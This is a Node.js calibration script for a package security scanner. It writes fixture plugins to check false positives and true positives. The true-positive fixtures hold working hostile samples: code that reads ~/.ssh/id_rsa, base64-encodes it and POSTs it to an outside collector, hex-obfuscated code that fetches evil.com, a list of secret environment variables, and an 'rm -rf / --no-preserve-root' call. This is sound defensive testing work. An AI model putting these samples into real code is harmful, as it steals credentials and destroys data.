/**
 * Check the batch run's false positives against the fixed engine.
 *
 * Each case here is a shape that appeared in `docs/stress/` with a `critical`
 * finding, transcribed to the smallest package that reproduces it. A scanner's
 * calibration is only as good as the cases it is checked against, and these came
 * from real, popular marketplace plugins rather than from imagination.
 *
 * Usage: node scripts/calibration-check.mjs
 */

import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

const { auditSource } = await import('../lib/scan/engine.js');

/** Write a plugin tree from a path→content map. */
function tree(files) {
  const root = mkdtempSync(join(tmpdir(), 'calib-'));
  for (const [path, content] of Object.entries(files)) {
    const target = join(root, path);
    mkdirSync(dirname(target), { recursive: true });
    writeFileSync(target, content, 'utf8');
  }
  return root;
}

const MANIFEST = JSON.stringify({ name: 'calibration-fixture', version: '1.0.0' });

/** One case: a description, the tree, and the finding ids that must NOT appear. */
const CASES = [
  {
    name: 'a minified bundle with a bundler preamble and its own API call',
    forbidden: ['obf.obfuscation-with-network-callback'],
    files: {
      'package.json': MANIFEST,
      'src/index.ts': 'export const apply = () => 1;\n',
      'lib/client.js': [
        "// Bundled output: esbuild's own helpers, not application code.",
        'var __defProp = Object.defineProperty;',
        'var __getOwnPropNames = Object.getOwnPropertyNames;',
        'var __commonJS = (cb, mod) => function __require() { return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports; };',
        'var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __defProp(target, "default", { value: mod, enumerable: true }));',
        `async function load() { const response = await fetch('https://api.example.com/v1/status'); return response.json(); }`,
        'module.exports = { load };',
      ].join('\n'),
    },
  },
  {
    // The destructive literal lives only in the test. The source declares the
    // pattern, the test feeds it a command — so a finding here is a fact about
    // the test, not about what installing the package does.
    name: 'a test that asserts a destructive command is rejected',
    capped: { id: 'destructive.shipped-command', severity: 'low' },
    files: {
      'package.json': MANIFEST,
      'src/index.ts': 'export const isDestructive = (input) => /rm\\s+-rf\\s+\\//.test(input);\n',
      'test/sanitize-command.test.js': [
        "import { test } from 'node:test';",
        "import assert from 'node:assert';",
        '',
        "test('detects a recursive delete of the root', () => {",
        "  assert.equal(isDestructive('echo; rm -rf /'), true);",
        '});',
      ].join('\n'),
    },
  },
  {
    name: 'a UI label that mentions a credential path, next to a fetch',
    forbidden: ['exfil.credential-read-then-callback', 'exfil.environment-harvest-then-callback'],
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        "const KEYS_HINT = '密钥读取优先级：.credentials.yaml 凭据中心 > 这里 > 环境变量。';",
        "export async function refresh() { return fetch('https://api.example.com/refresh', { method: 'POST' }); }",
        'export const hint = KEYS_HINT;',
      ].join('\n'),
    },
  },
  {
    name: 'a credential read plus a byte conversion plus a request',
    forbidden: ['exfil.credential-read-decode-callback'],
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        "import { readFileSync } from 'node:fs';",
        "import { homedir } from 'node:os';",
        "export async function upload() {",
        "  const secret = readFileSync(`${homedir()}/.aws/credentials`, 'utf8');",
        '  const payload = Buffer.from(JSON.stringify({ body: secret.length }));',
        "  return fetch('https://api.example.com/report', { method: 'PUT', body: payload });",
        '}',
      ].join('\n'),
    },
  },
  {
    name: 'an environment dump sent to a local dev server',
    forbidden: ['exfil.environment-harvest-then-callback'],
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        'export const dump = () => JSON.stringify(process.env).length;',
        "export async function ping() { return fetch('http://127.0.0.1:3080/health'); }",
      ].join('\n'),
    },
  },
  {
    name: 'a single documented API key read alongside its own service call',
    forbidden: ['cred.environment-secret-enumeration'],
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        'export const apiKey = process.env.EXAMPLE_SERVICE_API_KEY;',
        "export const call = () => fetch('https://api.example.com/v1/models', { headers: { authorization: `Bearer ${apiKey}` } });",
      ].join('\n'),
    },
  },
];

/* ── The other direction: these must still be caught. ─────────────────────── */

const TRUE_POSITIVES = [
  {
    name: 'a real encoded exfiltration still reaches the correlation',
    expected: 'exfil.credential-read-decode-callback',
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        "import { readFileSync } from 'node:fs';",
        "import { homedir } from 'node:os';",
        "export async function sync() {",
        "  const key = readFileSync(`${homedir()}/.ssh/id_rsa`);",
        "  const encoded = key.toString('base64');",
        "  return fetch('https://collector.example.net/ingest', { method: 'POST', body: encoded });",
        '}',
      ].join('\n'),
    },
  },
  {
    name: 'genuine obfuscation in readable source still reaches the correlation',
    expected: 'obf.obfuscation-with-network-callback',
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        'const _0x1a2b = ["\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f", "\\x65\\x76\\x69\\x6c", "\\x2e\\x63\\x6f\\x6d"];',
        'const _0x3c4d = (i) => String.fromCharCode(..._0x1a2b[i].split("").map((c) => c.charCodeAt(0)));',
        'export async function go() { return fetch(_0x3c4d(0) + _0x3c4d(1) + _0x3c4d(2)); }',
      ].join('\n'),
    },
  },
  {
    name: 'enumerating six differently-named secrets is still a finding',
    expected: 'cred.environment-secret-enumeration',
    files: {
      'package.json': MANIFEST,
      'src/index.ts': [
        'export const keys = [',
        '  process.env.OPENAI_API_KEY,',
        '  process.env.ANTHROPIC_API_KEY,',
        '  process.env.GOOGLE_API_KEY,',
        '  process.env.AWS_SECRET_ACCESS_KEY,',
        '  process.env.GITHUB_TOKEN,',
        '  process.env.STRIPE_SECRET_KEY,',
        '];',
      ].join('\n'),
    },
  },
  {
    name: 'a shipped destructive command in source is still critical',
    expected: 'destructive.shipped-command',
    files: {
      'package.json': MANIFEST,
      'src/index.ts': "export const clean = () => execSync('rm -rf / --no-preserve-root');\n",
    },
  },
];

let failures = 0;
console.log('--- shapes that must no longer decide a grade ---\n');
for (const item of CASES) {
  const result = await auditSource(tree(item.files));
  const hit = result.findings.filter((finding) => (item.forbidden ?? []).includes(finding.id));
  // A capped case is expected to be *reported* — a reader wants to see the
  // fixture — but at a severity that cannot pin the grade on its own.
  let cappedWrong;
  if (item.capped !== undefined) {
    const reported = result.findings.find((finding) => finding.id === item.capped.id);
    if (reported === undefined) cappedWrong = 'not reported at all';
    else if (reported.severity !== item.capped.severity) cappedWrong = `severity ${reported.severity}, expected ${item.capped.severity}`;
    else if (result.grade === 'D') cappedWrong = 'still pinned the grade at D';
  }
  const bad = hit.length !== 0 || cappedWrong !== undefined;
  const status = bad ? 'FAIL' : 'ok  ';
  if (bad) failures += 1;
  console.log(`  ${status}  ${item.name}  →  grade ${result.grade}, ${result.findings.length} findings`);
  for (const finding of hit) {
    console.log(`          still fired: ${finding.id} (${finding.severity}) at ${finding.evidence[0]?.file}:${finding.evidence[0]?.line}`);
  }
  if (cappedWrong !== undefined) console.log(`          ${item.capped.id}: ${cappedWrong}`);
}

console.log('\n--- shapes that must still fire ---\n');
for (const item of TRUE_POSITIVES) {
  const result = await auditSource(tree(item.files));
  const found = result.findings.some((finding) => finding.id === item.expected);
  const status = found ? 'ok  ' : 'FAIL';
  if (!found) failures += 1;
  console.log(`  ${status}  ${item.name}  →  grade ${result.grade}, expected ${item.expected}`);
  if (!found) console.log(`          missing; got ${result.findings.map((f) => f.id).join(', ') || 'nothing'}`);
}

console.log(`\n${failures === 0 ? 'all calibration cases behave as intended' : `${failures} case(s) did not`}`);
process.exit(failures === 0 ? 0 : 1);
